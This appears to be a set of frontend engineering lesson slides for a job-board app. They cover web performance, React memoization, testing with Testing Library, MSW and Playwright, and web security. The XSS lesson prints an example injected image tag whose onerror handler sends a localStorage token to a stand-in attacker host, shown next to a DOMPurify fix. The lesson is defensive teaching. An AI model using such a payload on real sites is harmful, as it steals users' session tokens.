Lesson 1 · Core Web Vitals

Three numbers for what users feel

Each one is scored at the 75th percentile of real visits, phones and desktops separately. Pass all three at p75 and the page passes — which still allows one visit in four to be slower than that.

Lesson 1 · Lab vs field

The lab says why. The field says whether.

ToolDataAnswersCan't tell you
Lighthouse, Performance panelLab. One load, one machine, simulated slow 4G and 4× CPU slowdown.Why it's slow: the waterfall, long tasks, which element is the LCP.INP. Nobody clicks in a lab run, so it reports Total Blocking Time instead.
CrUX, via PageSpeed InsightsField. Real Chrome users, a rolling 28 days, p75.Do our users pass? The verdict that counts.Why, or what changed this week. Low-traffic pages get no data.
RUM, web-vitals in RasmiField. Every visit you choose to send.Which page, device, element and release.Nothing for free. You build the pipeline and the sampling.
A Lighthouse 98 on your laptop next to a failing CrUX p75 is not a contradiction. Use the lab to diagnose and the field to judge.

Lesson 2 · Reading the bundle

Find the import that cost 300 KB

$ vite build --sourcemap
$ npx source-map-explorer 'dist/assets/*.js'
// src/app/routes.tsx
import { PostJobPage } from '@/features/post-job';
// static import → in main.js, for every visitor
Seekers are nearly all of Rasmi's traffic. None of them opens the employer editor, and every one of them downloads, parses and compiles it.

Lesson 2 · Images

Reserve the box, rush the hero

The job page's cover: the LCP element

<img
  src="/covers/acme-800.avif"
  srcSet="/covers/acme-400.avif 400w,
          /covers/acme-800.avif 800w,
          /covers/acme-1600.avif 1600w"
  sizes="(max-width: 760px) 100vw, 720px"
  width={1600} height={900}
  fetchPriority="high"
  alt="Acme's Cairo office"
/>
AttributeWhat it fixes
width + heightThe browser reserves the box from the ratio before a byte arrives. CLS
no loading="lazy"A lazy image is only requested after layout. On the hero, that wait is pure load delay. LCP
fetchPriorityPuts it ahead of below-the-fold images in the queue. LCP
srcSet + sizes, AVIFA phone fetches the 400 px file, not the 1600 px JPEG. LCP
Lazy-load everything below the fold, such as the 30 employer logos further down. Never lazy-load the LCP image. In a client-rendered page the <img> doesn't exist until the JS runs, so the smaller bundle from a minute ago is an LCP fix too.

Lesson 2 · Fonts and the CLS score

A late font moves text that already painted

@font-face {
  font-family: 'Inter';
  src: url('/fonts/inter.woff2') format('woff2');
  font-display: swap;        /* text now, Inter later */
}
@font-face {                 /* Arial, cut to Inter's size */
  font-family: 'Inter Fallback';
  src: local('Arial');
  size-adjust: 107.4%;
  ascent-override: 90.2%;
  descent-override: 22.5%;
}
body {
  font-family: 'Inter', 'Inter Fallback', sans-serif;
}
font-display: optional avoids the swap entirely. swap plus a metric-matched fallback keeps the font and loses the jump. Either way, preload the one file the first screen needs.

Lesson 3 · Memoization that helps

memo only skips when every prop is the same

Wrapped in memo, renders anyway

export const JobCard = memo(function JobCard(props) {
  /* … */
});

<JobCard
  job={job}
  isSelected={job.id === selectedId}
  now={Date.now()}                  // ✗ new number
  onSelect={(id) => setSelectedId(id)} // ✗ new function
/>

Same props, render skipped

const now = useMemo(() => Date.now(), []);

<JobCard
  job={job}
  isSelected={job.id === selectedId}
  now={now}                // ✓ same number
  onSelect={setSelectedId} // ✓ setters never change
/>
memo compares each prop with Object.is. If one prop is new on every render, you pay for the comparison and the render. Selecting a job in Rasmi re-rendered all 120 cards before this change and 2 after it: the one that lost the highlight and the one that gained it.

Lesson 4 · Behaviour, not implementation

Test what the user sees, not how you built it

Breaks on every refactor

const { container } = render(<App />);
const cards = container.querySelectorAll('.job-card');

fireEvent.click(cards[2]);
expect(cards[2]).toHaveClass('is-selected');

// rename a class or re-sort the list → red,
// though nothing a user sees has changed

Breaks only when the feature does

const user = userEvent.setup();
render(<App />);

await user.click(await screen.findByRole('button',
  { name: /^React Engineer/ }));
await user.click(
  screen.getByRole('button', { name: 'Apply now' }));

expect(await screen.findByRole('button',
  { name: /Application sent/ })).toBeDisabled();
Swap useState for a reducer, split JobCard in two or rename every class, and the right-hand test stays green. It goes red only when a seeker can no longer find a role and apply.

Lesson 4 · MSW

Mock the network, not your fetch function

// src/test/handlers.ts
import { http, HttpResponse } from 'msw';

export const handlers = [
  http.get('/api/jobs', ({ request }) => {
    const q = new URL(request.url).searchParams.get('q');
    return HttpResponse.json(search(jobs, q ?? ''));
  }),
];

// src/test/setup.ts · setupServer from 'msw/node'
export const server = setupServer(...handlers);
beforeAll(() => server.listen({ onUnhandledRequest: 'error' }));
afterEach(() => server.resetHandlers());
afterAll(() => server.close());
it('shows a retry when the API fails', async () => {
  server.use(
    http.get('/api/jobs', () =>
      new HttpResponse(null, { status: 500 })),
  );
  render(<App />);

  expect(await screen.findByRole('alert'))
    .toHaveTextContent(/try again/i);
});
// one test, one override, reset afterwards
The real fetchJobs, fetch, JSON parsing and error branch all run. Only the server is fake. The same handlers run in the browser through setupWorker from msw/browser.

Lesson 4 · Playwright

One real browser, one journey that matters

import { test, expect } from '@playwright/test';

test('a seeker finds a role and applies', async ({ page }) => {
  await page.goto('/');
  await page.getByRole('combobox', { name: 'Search jobs' })
    .fill('react');
  await page.getByRole('button', { name: /^React Engineer/ })
    .click();
  await page.getByRole('button', { name: 'Apply now' }).click();
  await expect(page.getByRole('button',
    { name: /Application sent/ })).toBeDisabled();
});
// playwright.config.ts
export default defineConfig({
  retries: process.env.CI ? 2 : 0,
  use: {
    baseURL: 'http://localhost:4173',
    trace: 'on-first-retry',
  },
  webServer: {
    command: 'pnpm build && pnpm preview',
    url: 'http://localhost:4173',
  },
});
No sleeps. Every action waits until the element is visible, enabled and not covered, and expect retries for up to 5 s. When CI fails, the trace shows the DOM, network and console at every step.

Lesson 5 · XSS

React escapes text. Your HTML is on you.

Employer HTML, straight in

// job.description: HTML the employer typed
<div dangerouslySetInnerHTML={{ __html: job.description }} />

// one employer posts this:
<img src=x onerror="fetch('//evil.example?t='+localStorage.token)">

Sanitised before it renders

import DOMPurify from 'dompurify';

const html = DOMPurify.sanitize(job.description);
<div dangerouslySetInnerHTML={{ __html: html }} />

// <img src="x"> survives, onerror does not
Other sinks to grep for: innerHTML, eval, new Function, and href={job.applyUrl}, where you allow only https: and mailto:. {job.title} is safe. Anything that bypasses JSX text is not.

Lesson 5 · Where to put a token

If JavaScript can read it, XSS can steal it

WhereCan injected script read it?Sent automatically?Use it for
localStorageYes. One line sends it away.NoNever for auth
A variable in memoryYes, while the tab is openNoA short-lived access token, at most
Cookie, HttpOnlyNoYes, so it needs a CSRF defenceThe session or refresh token
Set-Cookie: __Host-session=…; Path=/; Secure; HttpOnly; SameSite=Lax
CSRF is the price of cookies. SameSite=Lax keeps the cookie off cross-site POSTs. On top of that, check Origin or a CSRF token on every state-changing request, and never change state on a GET.

Lesson 5 · Content Security Policy

CSP: the seatbelt for the XSS you missed

Content-Security-Policy:
  script-src 'nonce-R4nd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  report-to csp
Reporting-Endpoints: csp="https://rasmi.example/csp"

<!-- the only scripts that run carry the nonce -->
<script nonce="R4nd0m" type="module" src="/assets/main.js"></script>
DirectiveWhat it stops
'nonce-…'Any script without this response's nonce, including injected <script> tags and inline onerror=.
'strict-dynamic'Nothing; it lets trusted scripts load others, so lazy chunks still work.
object-src
base-uri		Plugin embeds, and a <base> tag that re-points relative script URLs.
frame-ancestorsOther sites framing Rasmi to trick a click on “Apply now”.
Ship it as Content-Security-Policy-Report-Only first: same policy, nothing blocked, every violation reported. Switch to enforcing once the reports go quiet.
